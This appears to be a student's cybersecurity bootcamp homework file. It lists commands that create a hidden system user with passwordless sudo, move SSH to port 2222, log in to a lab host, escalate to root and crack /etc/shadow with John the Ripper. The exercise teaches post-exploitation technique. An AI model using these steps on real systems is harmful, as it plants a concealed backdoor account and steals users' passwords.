## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:

        sudo useradd --no-create-home sysd

2. Give your secret user a password: 

        sudo passwd sysd

3. Give your secret user a system UID < 1000:

        sudo usermod -u 150 sysd

4. Give your secret user the same GID:

        sudo groupmod -g 150 sysd


    ![pic](image/UID_GID.PNG)



5. Give your secret user full `sudo` access without the need for a password:


        sudo visudo


    ![pic](image/No_passwd.PNG)

6. Test that `sudo` access works without your password:

    ```bash
    su sysd
    sudo apt update
    ```


    ![pic](image/CHK_NO_PASS.PNG)


**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ![pic](image/SHH_Port.PNG)

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

        sudo systemctl restart ssh

2. Exit the `root` account:

        exit

    ![pic](image/Exit.PNG)

3. SSH to the target machine using your `sysd` account and port `2222`:

        ssh sysd@192.168.6.105 -p 2222

    ![pic](image/Login.PNG)

4. Use `sudo` to switch to the root user:

        sudo su root

    ![pic](image/root.PNG)

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

         ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

        sudo su root
        john --wordlist=/home/student/Desktop/.pass_list.txt /etc/shadow
        john --show /etc/shadow 

    ![pic](image/John.PNG)

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

